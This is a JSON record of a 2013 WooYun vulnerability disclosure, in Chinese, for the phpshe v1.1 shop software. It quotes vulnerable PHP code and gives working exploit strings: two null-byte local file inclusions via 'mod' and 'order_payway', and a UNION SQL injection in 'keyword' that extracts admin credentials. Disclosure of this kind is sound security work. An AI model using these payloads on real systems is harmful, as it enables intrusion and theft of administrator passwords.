{"id": 12592, "wybug_id": "wooyun-2013-021406", "wybug_title": "phpshe v1.1 多处文件包含与SQL注射漏洞等", "wybug_corp": "phpshe.com", "wybug_author": "knife", "wybug_date": "2013-04-12 16:44", "wybug_open_date": "2013-05-27 16:45", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "设计缺陷", "文件包含漏洞", "设计错误", "逻辑错误", "设计不当", "文件包含漏洞利用技巧", "源码审核", "源码分析", "文件包含", "搜索类型注射", "本地文件包含利用", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-04-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-04-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-04-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-05-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-05-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-05-27：\t细节向公众公开  简要描述： 比较严重，综合利用起来 详细说明：  /*******************************************************//* Phpshe v1.1 Vulnerability/* ========================/* By: : Kn1f3/* E-Mail : 681796@qq.com/*========================/*******************************************************//* Welcome to http://www.90sec.com *//*******************************************************/0x00 整体大概参数传输\n//common.phpif (get_magic_quotes_gpc()) {\t!empty($_GET) && extract(pe_trim(pe_stripslashes($_GET)), EXTR_PREFIX_ALL, '_g');\t!empty($_POST) && extract(pe_trim(pe_stripslashes($_POST)), EXTR_PREFIX_ALL, '_p');}else {\t!empty($_GET) && extract(pe_trim($_GET),EXTR_PREFIX_ALL,'_g');\t!empty($_POST) && extract(pe_trim($_POST),EXTR_PREFIX_ALL,'_p');}session_start();!empty($_SESSION) && extract(pe_trim($_SESSION),EXTR_PREFIX_ALL,'_s');!empty($_COOKIE) && extract(pe_trim(pe_stripslashes($_COOKIE)),EXTR_PREFIX_ALL,'_c');\n0x01 包含漏洞\n//首页文件<?phpinclude('common.php');$cache_category = cache::get('category');$cache_category_arr = cache::get('category_arr');$cache_class = cache::get('class');$cache_ad = cache::get('ad');$cache_link = cache::get('link');$cache_page = cache::get('page');$web_qq = $cache_setting['web_qq']['setting_value'] ? explode(',', $cache_setting['web_qq']['setting_value']) : array();$cart_num = pe_login('user') ? $db->pe_num('cart', array('user_id'=>$_s_user_id)) : (unserialize($_c_cart_list) ? count(unserialize($_c_cart_list)) : 0);include(\"{$pe['path_root']}module/{$module}/{$mod}.php\");  //$mod可控造成“鸡肋”包含漏洞pe_result();?>//common 文件 第15行开始url路由配置$module = $mod = $act = 'index';$mod = $_POST['mod'] ? $_POST['mod'] : ($_GET['mod'] ? $_GET['mod'] : $mod);$act = $_POST['act'] ? $_POST['act'] : ($_GET['act'] ? $_GET['act'] : $act);$id = $_POST['id'] ? $_POST['id'] : ($_GET['id'] ? $_GET['id'] : $id);//exp：//http://127.0.0.1/phpshe_v1.1/index.php?mod=../../robots.txt%00\n0x02 搜索注入\n//product.php文件case 'list':\t\t$category_id = intval($id);\t\t$info = $db->pe_select('category', array('category_id'=>$category_id));\t\t//搜索\t\t$sqlwhere = \" and `product_state` = 1\";\t\tpe_lead('hook/category.hook.php');\t\tif ($category_id) {\t\t\t$sqlwhere .= is_array($category_cidarr = category_cidarr($category_id)) ? \" and `category_id` in('\".implode(\"','\", $category_cidarr).\"')\" : \" and `category_id` = '{$category_id}'\";\t\t}\t\t$_g_keyword && $sqlwhere .= \" and `product_name` like '%{$_g_keyword}%'\"; //keyword变量未进行有效的sql语句过滤\t\tif ($_g_orderby) {\t\t\t$orderby = explode('_', $_g_orderby);\t\t\t$sqlwhere .= \" order by `product_{$orderby[0]}` {$orderby[1]}\";\t\t}\t\telse {\t\t\t$sqlwhere .= \" order by `product_id` desc\";\t\t}\t\t$info_list = $db->pe_selectall('product', $sqlwhere, '*', array(16, $_g_page));\t\t//热卖排行\t\t$product_hotlist = product_hotlist();\t\t//当前路径\t\t$nowpath = category_path($category_id);\t\t$seo = pe_seo($info['category_name']);\t\tinclude(pe_tpl('product_list.html'));\t\t\t\t//跟进selectall函数库\tpublic function pe_selectall($table, $where = '', $field = '*', $limit_page = array())\t{\t\t//处理条件语句\t\t$sqlwhere = $this->_dowhere($where);\t\treturn $this->sql_selectall(\"select {$field} from `\".dbpre.\"{$table}` {$sqlwhere}\", $limit_page);\t}\t//exp product/list?keyword=kn1f3'+union+select+1,2,3,4,5,(select+concat(admin_name,0x27,admin_pw,0x27)+from+pe_admin),7,8,9,10,11,12,13,14,15,16,17,18,19 and+'1'='1\n0x03 包含漏洞2\n//order.phpcase 'pay':\t\t$order_id = pe_dbhold($_g_id);\t\t$cache_payway = cache::get('payway');\t\tforeach($cache_payway as $k => $v) {\t\t\t$cache_payway[$k]['payway_config'] = unserialize($cache_payway[$k]['payway_config']);\t\t\tif ($k == 'bank') {\t\t\t\t$cache_payway[$k]['payway_config']['bank_text'] = str_replace(array(\"\\r\", \"\\n\", \"\\t\"), '\\n', $cache_payway[$k]['payway_config']['bank_text']);\t\t\t}\t\t}\t\t$order = $db->pe_select('order', array('order_id'=>$order_id, 'order_state'=>'notpay'));\t\t!$order['order_id'] && pe_error('订单号错误...');\t\tif (isset($_p_pesubmit)) {\t\t\tif ($db->pe_update('order', array('order_id'=>$order_id), $_p_info)) {\t\t\t\t$info_list = $db->pe_selectall('orderdata', array('order_id'=>$order_id));\t\t\t\tforeach ($info_list as $v) {\t\t\t\t\t$order['order_name'] .= \"{$v['product_name']};\";\t\t\t\t\t\t\t}\t\t\t\techo '正在为您连接支付网站，请稍后...';\t\t\t\tinclude(\"{$pe['path_root']}include/plugin/payway/{$_p_info['order_payway']}/order_pay.php\");\t\t\t}//当一切准备好的时候就可以进行\"鸡肋包含了\"\t\t\telse {\t\t\t\tpe_error('支付错误...');\t\t\t}\t\t}\t\t$seo = pe_seo('选择支付方式');\t\tinclude(pe_tpl('order_pay.html'));\tbreak;}//exp：//http://127.0.0.1/phpshe_v1.1/index.php?mod=order&act=pay&id=1304070001//info%5Border_payway%5D=alipay/../../../1.txt%00&pesubmit=%E7%AB%8B%E5%8D%B3%E6%94%AF%E4%BB%98\n   漏洞证明：  \n\n\n\n\n\n   修复方案：  几个漏洞，过滤过滤在过滤   版权声明：转载请注明来源 knife@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2013-04-12 17:10 厂商回复： 感谢knife对phpshe代码审查，bug已修正！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-04-10 15:14 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:170        | 力不从心)\t\t \n  刀哥给力哦    \n     2013-05-12 22:46 |    \t\t怡乐 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:1        | 小菜 入乌云 求好友 求妹子)\t\t \n  膜拜一下    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}